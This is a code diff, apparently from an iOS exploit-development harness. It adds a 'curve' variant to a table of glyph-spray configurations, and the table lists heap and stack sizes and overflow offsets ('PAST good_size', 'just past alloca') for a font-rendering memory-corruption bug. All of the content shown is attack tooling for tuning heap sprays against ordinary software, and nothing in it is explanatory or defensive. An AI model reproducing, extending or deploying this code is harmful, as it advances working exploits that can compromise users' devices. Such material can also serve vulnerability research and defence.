@@ -931,6 +931,7 @@ static size_t kpGlyphSpraySize(const char *vname) {
         !strcmp(vname, "w1b") || !strcmp(vname, "w1c")) return 4156;
     if (!strcmp(vname, "w4b")) return 8252;
     if (!strcmp(vname, "w3a")) return 4028;
+    if (!strcmp(vname, "curve")) return 4288;  // same as calif g3
     return 0x1000;
 }
 
@@ -940,11 +941,11 @@ static size_t kpGlyphSpraySize(const char *vname) {
 
     // ---- 1. pick variant (disk cursor, or forced name) ----
     NSString *idxPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents/kexproof-r5h-idx.txt"];
-    const char *names[14] = {
+    const char *names[15] = {
         "g1","g2","g3","g4","g5","g6","g7","g8",
-        "w1a","w1a_neg","w4b","w1b","w1c","w3a"
+        "w1a","w1a_neg","w4b","w1b","w1c","w3a","curve"
     };
-    const char *desc[14] = {
+    const char *desc[15] = {
         "tx32000 dx31 n9  STACK 992",
         "tx32000 dx32 n9  HEAP  1024",
         "tx32000 dx33 n9  HEAP  1056",
@@ -959,10 +960,11 @@ static size_t kpGlyphSpraySize(const char *vname) {
         "W1b     tx32858 dx32 n9  YS1 HEAP 4156 off~5180 PAST good_size",
         "W1c     tx32874 dx32 n9  YS1 HEAP 4156 off~6204 well past",
         "W3a     tx32840 dx31 n9  YS1 STACK 4028 just past alloca",
+        "CURVE   tx32000 dx33 n9  HEAP 1056 qCurveTo (aa_quadto)",
     };
     int idx = 0;
     if (forceName.length) {
-        for (int i = 0; i < 14; i++) {
+        for (int i = 0; i < 15; i++) {
             if ([forceName isEqualToString:@(names[i])]) { idx = i; break; }
         }
     } else {
